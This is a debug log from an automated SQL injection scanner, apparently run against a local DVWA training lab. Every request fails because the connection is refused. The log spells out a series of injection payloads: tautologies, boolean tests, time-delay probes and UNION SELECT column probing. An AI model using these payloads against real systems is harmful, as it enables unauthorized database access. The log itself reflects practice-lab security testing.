[2026-04-07 07:36:09] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%271%27%3D%271&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:14] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%271%27%3D%271%27+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:14] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%271%27%3D%271%27+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:14] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%271%27%3D%271%27+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:14] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%271%27%3D%271%27+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:18] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%271%27%3D%271%27+%2F%2A (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:18] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%271%27%3D%271%27+%2F%2A (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:18] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%271%27%3D%271%27+%2F%2A&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:18] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%271%27%3D%271%27+%2F%2A&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:23] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%22+OR+%221%22%3D%221 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:23] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%22+OR+%221%22%3D%221 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:23] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%22+OR+%221%22%3D%221&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:23] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%22+OR+%221%22%3D%221&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:27] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+1%3D1+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:27] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+1%3D1+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:27] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+1%3D1+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:27] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+1%3D1+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:32] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+1%3D1%23 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:32] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+1%3D1%23 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:32] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+1%3D1%23&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:32] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+1%3D1%23&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:36] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=admin%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:36] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=admin%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:36] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=admin%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:36] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=admin%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:41] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%27x%27%3D%27x&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:41] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+OR+%27x%27%3D%27x&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:41] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%27x%27%3D%27x (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:41] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+OR+%27x%27%3D%27x (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:46] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1+OR+1%3D1&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:46] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1+OR+1%3D1&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:46] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1+OR+1%3D1 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:46] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1+OR+1%3D1 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:50] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1%27+OR+%271%27%3D%271&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:50] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1%27+OR+%271%27%3D%271&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:50] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1%27+OR+%271%27%3D%271 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:50] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1%27+OR+%271%27%3D%271 (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:55] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1+OR+1%3D1-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:55] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1+OR+1%3D1-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:55] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1+OR+1%3D1--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:55] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1+OR+1%3D1--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:59] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+1%3D1+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:59] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+1%3D1+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:59] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+1%3D1+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:36:59] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+1%3D1+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:04] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+1%3D2+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:04] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+1%3D2+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:04] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+1%3D2+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:04] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+1%3D2+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:08] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+%27a%27%3D%27a (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:08] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+%27a%27%3D%27a (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:08] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+%27a%27%3D%27a&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:08] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+%27a%27%3D%27a&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:13] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+%27a%27%3D%27b&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:13] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+%27a%27%3D%27b&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:13] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+%27a%27%3D%27b (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:13] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+%27a%27%3D%27b (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:18] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:18] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:18] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:18] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+WAITFOR+DELAY+%270%3A0%3A3%27-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:22] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+SELECT+SLEEP%283%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:22] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27%3B+SELECT+SLEEP%283%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:22] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+SELECT+SLEEP%283%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:22] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27%3B+SELECT+SLEEP%283%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:27] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1%3B+SELECT+pg_sleep%283%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:27] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1%3B+SELECT+pg_sleep%283%29-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:27] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1%3B+SELECT+pg_sleep%283%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:27] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1%3B+SELECT+pg_sleep%283%29--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:31] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:31] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:31] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:31] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+UNION+SELECT+NULL--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:36] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL%2CNULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:37:36] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+UNION+SELECT+NULL%2CNULL-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
